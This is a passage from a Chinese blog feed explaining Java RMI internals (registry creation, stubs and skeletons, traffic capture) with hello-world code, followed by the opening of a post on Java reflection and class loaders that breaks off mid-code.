punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">UnicastRemoteObject</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RemoteHelloWorld</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">UnicastRemoteObject</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IRemoteHelloWorld</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token class-name\">RemoteHelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"访问成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Hello world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上面这个实现接口的类实际上就是能被远程调用的对象，对于调用方法 RMI 设计了一个 Registry 的思想，类似路由表的概念，实现这个主要通过 java.rmi.registry.Registry 和 java.rmi.Naming 来实现</p>\n<ol>\n<li>是 Java 远程方法调用（RMI）中的一个接口，提供了一个远程对象注册表。它用于将远程对象与名称绑定，然后可以使用该名称从远程客户端查找该对象。 <code>Registry</code>  接口定义了绑定（bind）、解绑（unbind）、列表（list）和查找（lookup）远程对象在注册表中的方法。</li>\n<li>是 Java 远程方法调用（RMI）中的一个类，提供了一个命名服务，用于在远程服务器上绑定和查找远程对象。它可以将一个远程对象绑定到一个 URL 地址上，这个 URL 地址可以被客户端用来查找该远程对象。<br />\n这是一个 final 方法，url 的格式 //host:post/name:\n<ol>\n<li>host，表示注册表所在的主机</li>\n<li>port 表示注册表接受调用的端口号，默认的是 1099</li>\n<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键词</li>\n</ol>\n</li>\n</ol>\n<p>使用  <code>LocateRegistry#createRegistry()</code>  方法来创建注册中心，将其加入到呆调用的类中进行绑定</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">Clown_RMI_code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Naming</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LocateRegistry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RemoteServer</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">createRegistry</span><span class=\"token punctuation\">(</span><span class=\"token number\">1099</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 创建注册中心</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">IRemoteHelloWorld</span> iRemoteHelloWorld <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RemoteHelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 创建远程对象</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Naming</span><span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rmi://127.0.0.1/Hello\"</span><span class=\"token punctuation\">,</span>iRemoteHelloWorld<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// 绑定</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>最后就是在客户端进行调用</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">Clown_RMI_code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">NotBoundException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LocateRegistry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Registry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RMIClient</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NotBoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 获取 RMI 注册表，参数为 RMI 服务器的 IP 和端口号</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Registry</span> registry <span class=\"token operator\">=</span> <span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRegistry</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"192.168.32.6\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1099</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// 打印出 RMI 注册表中所有已注册的服务名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//        System.out.println(Arrays.toString(registry.list()));</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// 根据服务名在 RMI 注册表中查找远程对象的 stub</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">IRemoteHelloWorld</span> stub <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IRemoteHelloWorld</span><span class=\"token punctuation\">)</span> registry<span class=\"token punctuation\">.</span><span class=\"token function\">lookup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// 调用远程对象的方法并打印结果</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stub<span class=\"token punctuation\">.</span><span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 RemoteServer 类中，创建注册中心后去创建了一个远程对象</p>\n<h3 id=\"注册中心的创建\"><a class=\"anchor\" href=\"#注册中心的创建\">#</a> 注册中心的创建</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">createRegistry</span><span class=\"token punctuation\">(</span><span class=\"token number\">1099</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里首先跟进代码看到</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070154150.png\" alt=\"image-20230407015432123\" /></p>\n<p>createRegistry 实际上 new 了 RegistryImpl 对象，继续跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070155087.png\" alt=\"image-20230407015543039\" /></p>\n<p>这段代码是 Java RMI 中  <code>RegistryImpl</code>  类的构造函数实现，用于创建 RMI 注册表。如果传入的  <code>port</code>  参数为默认的注册表端口  <code>Registry.REGISTRY_PORT</code> ，并且存在安全管理器，则授权注册表使用默认端口，并使用  <code>UnicastServerRef</code>  类导出远程对象，从而创建注册表的  <code>UnicastServerRef</code>  对象。否则，直接使用  <code>UnicastServerRef</code>  类导出远程对象，并创建注册表的  <code>UnicastServerRef</code>  对象。在导出远程对象时，使用  <code>LiveRef</code>  类来表示远程对象的引用，同时使用  <code>RegistryImpl::registryFilter</code>  方法来过滤注册表的传输流。</p>\n<h3 id=\"远程对象创建\"><a class=\"anchor\" href=\"#远程对象创建\">#</a> 远程对象创建</h3>\n<p>这个对象是继承了 UnicastRemoteObject，前面也有提到这个类会自动 export 远程，并获取 Stub，Stub 是一个代理类</p>\n<p>首先这里会调用的静态方法 exportObject</p>\n<p>它是 <code>java.rmi.server.RemoteObject</code>  类中的一个静态方法。它用于导出远程对象并返回一个存根，该存根可用于调用远程对象上的方法。</p>\n<p>该方法有两个参数：要导出的  <code>Remote</code>  对象和一个  <code>UnicastServerRef</code>  对象。如果要导出的对象继承了  <code>UnicastRemoteObject</code>  类，那么该方法将设置它的  <code>ref</code>  字段。最后，该方法会调用  <code>sref.exportObject(obj, null, false)</code>  方法导出远程对象，并返回导出的远程对象的存根。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070102824.png\" alt=\"image-20230407010207778\" /></p>\n<p>对 RemoteHelloWorld 的 exprot 的创建主要是通过 createprot 方法使用 RemoteObjectInvocationHandler 来为我们测试写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070133637.png\" alt=\"image-20230407013315581\" /></p>\n<p>接下来首先看 RemoteObjectInvocationHandler 这个动态代理</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070145489.png\" alt=\"image-20230407014515460\" /></p>\n<p>继承 RemoteObject 实现 InvocationHandler，因此这是一个可序列化的、可使用 RMI 远程传输的动态代理类，对于动态代理我们这里重点看一下 invoke 方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070146035.png\" alt=\"image-20230407014619996\" /></p>\n<p>在  <code>invoke</code>  方法中，首先判断传入的  <code>proxy</code>  参数是否是一个代理类，如果不是，则抛出一个  <code>IllegalArgumentException</code>  异常。然后，判断传入的  <code>proxy</code>  参数是否与当前的  <code>InvocationHandler</code>  对象匹配，如果不匹配，则抛出一个  <code>IllegalArgumentException</code>  异常。最后，判断要调用的方法是不是  <code>Object</code>  类中的方法，如果是，则调用  <code>invokeObjectMethod</code>  方法来处理方法调用，否则调用  <code>invokeRemoteMethod</code>  方法来处理远程方法调用。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070148473.png\" alt=\"image-20230407014842429\" /></p>\n<p>在 invokeObjectMethod 中判断要调用的方法是不是  <code>Object</code>  类中的  <code>equals</code> 、 <code>hashCode</code>  或  <code>toString</code>  方法，如果是，则直接调用  <code>Object</code>  类中的相应方法，否则抛出一个  <code>UnsupportedOperationException</code>  异常。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070150296.png\" alt=\"image-20230407015000249\" /></p>\n<p>在  <code>invokeRemoteMethod</code>  方法中，会将方法调用序列化成字节流，并通过 JRMP 协议发送给远程对象。远程对象收到方法调用后，会将字节流反序列化成方法调用，并执行该方法，最后将方法的返回值序列化成字节流，通过 JRMP 协议发送给客户端。</p>\n<h3 id=\"服务注册\"><a class=\"anchor\" href=\"#服务注册\">#</a> 服务注册</h3>\n<p>实际上就是绑定过程</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070200528.png\" alt=\"image-20230407020030495\" /></p>\n<p>首先调用了 <code>parseURL</code>  方法来解析 <code>name</code>  参数，然后通过 <code>getRegistry</code>  方法获取了一个 <code>Registry</code>  对象。接下来，如果 <code>obj</code>  参数为 <code>null</code> ，则会抛出 <code>NullPointerException</code>  异常。最后，使用 <code>registry.bind(parsed.name, obj)</code>  方法将 <code>obj</code>  对象绑定到命名服务中。</p>\n<p>这样一个流程来 javasec 上面总结的很详细</p>\n<p>RMI 底层通讯采用了 Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>\n<ol>\n<li>RMI 客户端在调用远程方法时会先创建 Stub (  <code>sun.rmi.registry.RegistryImpl_Stub</code>  )。</li>\n<li>Stub 会将 Remote 对象传递给远程引用层 (  <code>java.rmi.server.RemoteRef</code>  ) 并创建  <code>java.rmi.server.RemoteCall</code>  (远程调用) 对象。</li>\n<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>\n<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>\n<li>RMI 服务端的远程引用层 (  <code>sun.rmi.server.UnicastServerRef</code>  ) 收到请求会请求传递给 Skeleton (  <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>  )。</li>\n<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>\n<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>\n<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>\n<li>RMI 客户端调用远程方法，RMI 服务端反射调用 RMI 服务实现类的对应方法并序列化执行结果返回给客户端。</li>\n<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>\n</ol>\n<h2 id=\"rmi流程流量\"><a class=\"anchor\" href=\"#rmi流程流量\">#</a> RMI 流程（流量）</h2>\n<p>这里对 <code>需要注意的是RMI被调用的方法执行在客户端</code> ，P 牛的 JAVA 漫谈中抓包分析，但是我本地的包有较多的混淆流量流，这里直接用 P 牛的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303280024784.png\" alt=\"image-20230328002451679\" /></p>\n<p>这个是整个流程</p>\n<p>首先这里有一次 TCP 握手，跟踪这个流</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071034441.png\" alt=\"image-20230407103458372\" /></p>\n<p>接着是一个协议确认，客户端向服务器发送了<em> StreamProtocol</em> 用于确认服务器是否支持此协议</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071056208.png\" alt=\"image-20230407105655174\" /></p>\n<p>接着是服务端向客户端发送的一个确认包确认 ip 和端口号</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071057648.png\" alt=\"image-20230407105719590\" /></p>\n<p>客户端发给服务器一个 ip 地址，这个 ip 是客户端的 ip 地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071058910.png\" alt=\"image-20230407105815867\" /></p>\n<p>接着发送 call 请求</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071101046.png\" alt=\"image-20230407110109999\" /></p>\n<p>服务端返回 Returndata 包</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071102087.png\" alt=\"image-20230407110212035\" /></p>\n<p>这段是 java 序列化后的内容，⾸先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据流中的 Call 消息；然后 Registry 返回⼀个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.18.0.1:12137 ，于是再与这个地址建⽴ TCP 连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello ()</p>\n<p>然后是服务端和客户端的 ping 包</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071105955.png\" alt=\"image-20230407110506927\" /></p>\n<p>最后一个输出消息包 DgcAck 指示客户端已接收到服务器返回值中的远程对象</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071106096.png\" alt=\"image-20230407110619069\" /></p>\n<p>接着就断开 tcp 连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071113942.png\" alt=\"image-20230407111353918\" /></p>\n",
            "tags": [
                "java安全",
                "RMI"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/",
            "url": "https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/",
            "title": "java反射",
            "date_published": "2023-03-26T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>大佬几年前的文章还是能让我受益匪浅，这里浅记 java 反射的学习，参考了 P 牛的文章</p>\n<h2 id=\"java反射forname\"><a class=\"anchor\" href=\"#java反射forname\">#</a> java 反射 (forName)</h2>\n<p>首先看看官方对反射的解释</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Reflection enables Java code to discover information about the fields<span class=\"token punctuation\">,</span> methods <span class=\"token operator\">and</span> constructors of loaded classes<span class=\"token punctuation\">,</span> <span class=\"token operator\">and</span> to <span class=\"token keyword\">use</span> reflected fields<span class=\"token punctuation\">,</span> methods<span class=\"token punctuation\">,</span> <span class=\"token operator\">and</span> constructors to operate on their underlying counterparts<span class=\"token punctuation\">,</span> within security restrictions<span class=\"token operator\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>The API accommodates applications that need access to either the public members of a target object <span class=\"token punctuation\">(</span>based on its runtime class<span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span> the members declared by a <span class=\"token keyword\">given</span> class<span class=\"token operator\">.</span> It also allows programs to suppress <span class=\"token keyword\">default</span> reflective access control<span class=\"token operator\">.</span></pre></td></tr></table></figure><p>java 安全从反序列化入手，从反射入门反序列化，反射是大多数语言不可或缺的部分，对象可以通过反射来获取其他的类，类可以通过反射拿到所有的成员方法 ( <code>Methods</code> )、成员变量 ( <code>Fields</code> )、构造方法 ( <code>Constructors</code> )，这里所有就是字面意思上的所有，包括私有类</p>\n<h2 id=\"类的加载机制\"><a class=\"anchor\" href=\"#类的加载机制\">#</a> 类的加载机制</h2>\n<p>学习 java，不得不学习他的类加载机制，java 是依赖于 JVM 实现的跨平台语言，在运行时需要先编译成 class 文件，在初始化的时候会调用 java.lang.ClassLoader 加载类字节码这里贴一张大佬的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303252145254.png\" alt=\"image-20230325214537182\" /></p>\n<p>类加载分为四层，一共有四层 classloader（程序在启动的时候不会一次性加载所有的 class 文件，而是根据程序的需要，通过 Java 的类加载机制来动态加载某个 class 文件到内存中）分别为</p>\n<ol>\n<li>\n<p>Extension ClassLoader：称为扩展类加载器，负责加载 Java 的扩展库，默认加载 JAVA_HOME/jre/bil/ext 下的所有 class 方法</p>\n</li>\n<li>\n<p>BootStrap ClassLoader：启动类加载器，是 Java 类加载层次顶层的类加载器，负责加载 JDK 中的核心类库，如：<strong>rt.jar、resources.jar、charsets.jar</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">lq</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> test <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token constant\">URL</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> urls <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>misc<span class=\"token punctuation\">.</span></span>Launcher</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBootstrapClassPath</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getURLs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>urls<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>urls<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toExternalForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过上面的代码，获取到该类加载器从哪些地方加载了相关的 jar 和 class 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212059400.png\" alt=\"image-20230321205954293\" /></p>\n</li>\n<li>\n<p>App ClassLoader: 系统类加载器。负责加载应用程序 classpath 目录下的所有 jar 和 class 文件</p>\n</li>\n<li>\n<p>Custom ClassLoader：上面三个是 java 默认提供的 classloader，用户可以根据需要自定义自己的 ClassLoader 文件</p>\n</li>\n</ol>\n<h3 id=\"原理介绍\"><a class=\"anchor\" href=\"#原理介绍\">#</a> 原理介绍</h3>\n<p>ClassLoader 使用的是双亲委派模型来搜索类，每一个 ClassLoader 实例都有一个父类加载器的引用，当需要搜索某个类的时候，这个过程是从上至下的，首先 Bootstrap ClassLoader 尝试加载如果没有加载到，交由 Extension ClassLoader 尝试加载，没找到交由 APP ClassLoader 尝试加载，如果还是没有加载到这返回给委托的发起者，由其指定（虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它 ClassLoader 实例的的父类加载器）这里如果都没找到会抛出异常</p>\n<p><code>ClassLoader</code>  类有如下核心方法：</p>\n<ol>\n<li><code>loadClass</code> （加载指定的 Java 类）</li>\n<li><code>findClass</code> （查找指定的 Java 类）</li>\n<li><code>findLoadedClass</code> （查找 JVM 已经加载过的类）</li>\n<li><code>defineClass</code> （定义一个 Java 类）</li>\n<li><code>resolveClass</code> （链接指定的 Java 类）</li>\n</ol>\n<p>使用这样的模型可以避免重复加载类，夫类已经加载了这个类的时候，没必要子 ClassLoader 在进行一次加载</p>\n<p>Jvm 中两个类是否相同需要同时满足两个条件</p>\n<ol>\n<li>两个类名相同</li>\n<li>两个类是由同一个 ClassLoader 实例加载的</li>\n</ol>\n<p>贴一张大佬的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212115678.png\" alt=\"image-20230321211521499\" /></p>\n<h2 id=\"反射demo\"><a class=\"anchor\" href=\"#反射demo\">#</a> 反射 demo</h2>\n<p>下面这样一段代码，在参数传入之前不知道他的作用是什么</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> className<span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span> methodName<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Class</span> clazz <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        clazz<span 